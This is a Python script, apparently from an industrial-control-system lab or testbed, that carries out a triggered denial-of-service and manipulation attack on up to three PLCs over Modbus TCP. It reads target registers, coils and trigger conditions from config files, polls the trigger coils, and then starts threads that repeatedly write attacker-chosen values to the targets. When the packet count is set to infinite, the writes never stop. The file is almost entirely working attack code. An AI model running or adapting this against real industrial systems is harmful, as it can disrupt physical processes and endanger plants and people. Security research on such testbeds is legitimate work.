import threading
import configparser

from pymodbus.client.tcp import ModbusTcpClient

# global variable that indicates the DoS attack has started
attack_started = False


def get_reg_type(register):
    map_a = {"Q": "C", "M": "H", "I": "I"}
    return map_a[register[0]]


def get_reg_addr(register):
    address = None
    if register[1] == "X":
        if len(register) > 5:
            address = int(register[5]) + (8 * int(register[2:4]))
        else:
            address = int(register[4]) + (8 * int(register[2]))
    elif register[1] == "W":
        if register[0] == "M":
            address = int(register[2:]) + 1024
        else:
            address = int(register[2:])
    elif register[1] == "D":
        address = int(register[2:]) + 2048
    elif register[1] == "L":
        address = int(register[2:]) + 4096
    return address


def perform_register_attack(client, address, value, packets):
    print("Writing " + str(value) + " to register %MX0." + str(address))
    count = 0
    while count < packets or packets == -1:
        resp = client.write_register(address, value)
        count += 1
        if resp.isError():
            print("ERROR writing register %MX0." + str(address))
    print("Attack to register %MX0." + str(address) + " completed.")


def perform_coil_attack(client, address, value, packets):
    print("Writing " + str(value) + " to coil %QX0." + str(address))
    count = 0
    while count < packets or packets == -1:
        resp = client.write_coil(address, value)
        count += 1
        if resp.isError():
            print("ERROR writing coil %QX0." + str(address))
    print("Attack to coil %QX0." + str(address) + " completed.")


def attack(ctx):
    #
    # reading attack configuration...
    prefs = {}
    attack_config = (configparser.ConfigParser())
    attack_config.read("attack_config.ini")
    attack_config.sections()

    prefs["packets"] = attack_config["general"]["packet_number"]
    prefs["value"] = attack_config["general"]["packet_value"]

    use_plc1 = attack_config["plc1"]["use"] == 'True'
    use_plc2 = attack_config["plc2"]["use"] == 'True'
    use_plc3 = attack_config["plc3"]["use"] == 'True'

    # check if PLC1, PLC2 and PLC3 should be attacked, and in case read the attack configuration
    if use_plc1:
        prefs["plc1"] = {}
        prefs["plc1"]["registers"] = attack_config["plc1"]["registers"].replace(' ', '').split(',') \
            if attack_config["plc1"]["registers"] != '' else []
        prefs["plc1"]["coils"] = attack_config["plc1"]["coils"].replace(' ', '').split(',') \
            if attack_config["plc1"]["coils"] != '' else []
        tr1 = attack_config["plc1"]["triggers"].replace(' ', '').split(',')
        prefs["plc1"]["triggers"] = [x.split('=') for x in tr1] if tr1 != [''] else []

    if use_plc2:
        prefs["plc2"] = {}
        prefs["plc2"]["registers"] = attack_config["plc2"]["registers"].replace(' ', '').split(',') \
            if attack_config["plc2"]["registers"] != '' else []
        prefs["plc2"]["coils"] = attack_config["plc2"]["coils"].replace(' ', '').split(',') \
            if attack_config["plc2"]["coils"] != '' else []
        tr2 = attack_config["plc2"]["triggers"].replace(' ', '').split(',')
        prefs["plc2"]["triggers"] = [x.split('=') for x in tr2] if tr2 != [''] else []

    if use_plc3:
        prefs["plc3"] = {}
        prefs["plc3"]["registers"] = attack_config["plc3"]["registers"].replace(' ', '').split(',') \
            if attack_config["plc3"]["registers"] != '' else []
        prefs["plc3"]["coils"] = attack_config["plc3"]["coils"].replace(' ', '').split(',') \
            if attack_config["plc3"]["coils"] != '' else []
        tr3 = attack_config["plc3"]["triggers"].replace(' ', '').split(',')
        prefs["plc3"]["triggers"] = [x.split('=') for x in tr3] if tr3 != [''] else []

    # print("CONFIG: " + str(prefs))

    #
    # retrieve registers, coils and triggers from PLCs
    registers_to_attack = []
    coils_to_attack = []
    triggers_register = []
    if "plc1" in prefs:
        registers_to_attack.append(prefs["plc1"]["registers"])
        coils_to_attack.append((prefs["plc1"]["coils"]))
        for trig in prefs["plc1"]["triggers"]:
            triggers_register.append(ctx.register("plc1", get_reg_type(trig[0]), get_reg_addr(trig[0])))

    if "plc2" in prefs:
        registers_to_attack.append(prefs["plc2"]["registers"])
        coils_to_attack.append((prefs["plc2"]["coils"]))
        for trig in prefs["plc2"]["triggers"]:
            triggers_register.append(ctx.register("plc2", get_reg_type(trig[0]), get_reg_addr(trig[0])))

    if "plc3" in prefs:
        registers_to_attack.append(prefs["plc3"]["registers"])
        coils_to_attack.append((prefs["plc3"]["coils"]))
        for trig in prefs["plc3"]["triggers"]:
            triggers_register.append(ctx.register("plc3", get_reg_type(trig[0]), get_reg_addr(trig[0])))

    print("TARGET REGISTERS: " + str(registers_to_attack))
    print("TARGET COILS: " + str(coils_to_attack))
    # print("TRIGGER COILS: " + str(triggers_register))

    #
    # listener that occurs when a register value changes
    def on_value_change(value: int):
        global attack_started

        # in case attack has already started return
        if attack_started:
            return

        #
        # check if the system is triggered by retrieving all PLCs values from 'trigger' list
        triggered = True
        client1 = None
        client2 = None
        client3 = None
        config = configparser.ConfigParser()
        config.read('config.ini')
        if "plc1" in prefs:
            hp1 = config['plc']['plc1'].split(":")
            # connect to PLC1
            client1 = ModbusTcpClient(hp1[0], int(hp1[1]))
            client1.connect()
            for tt in prefs["plc1"]["triggers"]:
                print("Checking value of PLC1 coil %QX0." + str(get_reg_addr(tt[0])))
                response = client1.read_coils(get_reg_addr(tt[0]))
                coil_val = 1 if response.bits[0] else 0
                triggered = triggered and coil_val == int(tt[1])    # checking value
                print("Value is {}... {}".format(coil_val, ("OK" if triggered else "NO")))

        if "plc2" in prefs:
            hp2 = config['plc']['plc2'].split(":")
            # connect to PLC2
            client2 = ModbusTcpClient(hp2[0], int(hp2[1]))
            client2.connect()
            for tt in prefs["plc2"]["triggers"]:
                print("Checking value of PLC2 coil %QX0." + str(get_reg_addr(tt[0])))
                response = client2.read_coils(get_reg_addr(tt[0]))
                coil_val = 1 if response.bits[0] else 0
                triggered = triggered and coil_val == int(tt[1])    # checking value
                print("Value is {}... {}".format(coil_val, ("OK" if triggered else "NO")))

        if "plc3" in prefs:
            hp3 = config['plc']['plc3'].split(":")
            # connect to PLC3
            client3 = ModbusTcpClient(hp3[0], int(hp3[1]))
            client3.connect()
            for tt in prefs["plc3"]["triggers"]:
                print("Checking value of PLC3 coil %QX0." + str(get_reg_addr(tt[0])))
                response = client3.read_coils(get_reg_addr(tt[0]))
                coil_val = 1 if response.bits[0] else 0
                triggered = triggered and coil_val == int(tt[1])    # checking value
                print("Value is {}... {}".format(coil_val, ("OK" if triggered else "NO")))

        #
        # attack if all the conditions are satisfied
        if triggered:
            print("Start attack...")
            attack_started = True
            n_pack = int(prefs["packets"]) if prefs["packets"] != 'inf' else -1
            value = int(prefs["value"]) > 0

            # stop listening for the value of the trigger coils.
            for c in triggers_register:
                c.stop_polling()

            # start one thread for each target registers and coils in every PLC.
            thread_list = []
            if client1 is not None:
                for target in prefs["plc1"]["registers"]:
                    proc_r = threading.Thread(target=perform_register_attack,
                                              args=(client1, get_reg_addr(target), value, n_pack))
                    thread_list.append(proc_r)
                    proc_r.start()
                for target in prefs["plc1"]["coils"]:
                    proc_c = threading.Thread(target=perform_coil_attack,
                                              args=(client1, get_reg_addr(target), value, n_pack))
                    thread_list.append(proc_c)
                    proc_c.start()

            if client2 is not None:
                for target in prefs["plc2"]["registers"]:
                    proc_r = threading.Thread(target=perform_register_attack,
                                              args=(client2, get_reg_addr(target), value, n_pack))
                    thread_list.append(proc_r)
                    proc_r.start()
                for target in prefs["plc2"]["coils"]:
                    proc_c = threading.Thread(target=perform_coil_attack,
                                              args=(client2, get_reg_addr(target), value, n_pack))
                    thread_list.append(proc_c)
                    proc_c.start()

            if client3 is not None:
                for target in prefs["plc3"]["registers"]:
                    proc_r = threading.Thread(target=perform_register_attack,
                                              args=(client3, get_reg_addr(target), value, n_pack))
                    thread_list.append(proc_r)
                    proc_r.start()
                for target in prefs["plc3"]["coils"]:
                    proc_c = threading.Thread(target=perform_coil_attack,
                                              args=(client3, get_reg_addr(target), value, n_pack))
                    thread_list.append(proc_c)
                    proc_c.start()

            for z in thread_list:
                z.join()
        else:
            # if conditions are not satisfied yet, wait!
            print("Waiting for a trigger....")

    #
    # start the polling of each coil involved in the triggering
    for reg in triggers_register:
        reg.start_polling(100, on_value_change)
